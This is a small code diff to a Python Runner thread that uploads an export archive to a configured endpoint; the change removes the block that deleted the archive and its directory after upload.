@@ -125,13 +125,7 @@ class Runner(threading.Thread):
                 httpx.post(self.endpoint, files={"export": file})
         except Exception as e:
             print(e)
-        finally:
-            # Delete the archive
-            safe_delete(archive_path)
-            # Also delete the directory that was created during the archive creation
-            if archive_path.exists():
-                shutil.rmtree(archive_path.parent, ignore_errors=True)
-
+       
 
     def run(self):
         delay = self.get_random_delay()
